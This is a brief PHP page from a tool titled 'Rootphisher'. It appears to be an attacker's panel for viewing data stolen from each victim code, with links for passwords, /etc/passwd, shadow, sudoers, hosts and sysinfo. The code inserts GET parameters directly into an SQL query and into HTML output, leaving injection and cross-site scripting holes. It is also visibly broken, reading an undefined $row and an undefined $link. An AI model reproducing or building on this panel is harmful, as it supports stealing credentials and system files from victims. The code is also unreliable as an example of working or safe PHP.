<?php

$code = @($_GET['code']);
$v = @($_GET['v']);

    if(isset($v)) {
        $q = "SELECT $v FROM data WHERE code = '$code'";
        $e = mysqli_query($link, $q);
        $r = mysqli_fetch_row($e);
        $result = $row[0];
        echo '<html><head><title>Rootphisher</title></head><body><h1>Content of '.$v.' ; Code: '.$code.' ; </h1><input type="text" readonly="" value="'.$result.'"></body></html>';
    } else {
       echo '<html><head><title>Rootphisher</title></head><body><h1>Available Views ; Code: '.$code.'</h1><a href="/view.php?v=password&code='.$code.'">Password</a><br><a href="/view.php?v=passwd&code='.$code.'">Passwd</a><br><a href="/view.php?v=issue&code='.$code.'">Issue</a><br><a href="/view.php?v=resolv&code='.$code.'">Resolv</a><br><a href="/view.php?v=hosts&code='.$code.'">Hosts</a><br><a href="/view.php?v=shadow&code='.$code.'">Shadow</a><br><a href="/view.php?v=group&code='.$code.'">Group</a><br><a href="/view.php?v=sudoers&code='.$code.'">Sudoers</a><br><a href="/view.php?v=sysinfo&code='.$code.'">Sysinfo</a><br><br></body></html>';
    }

?>
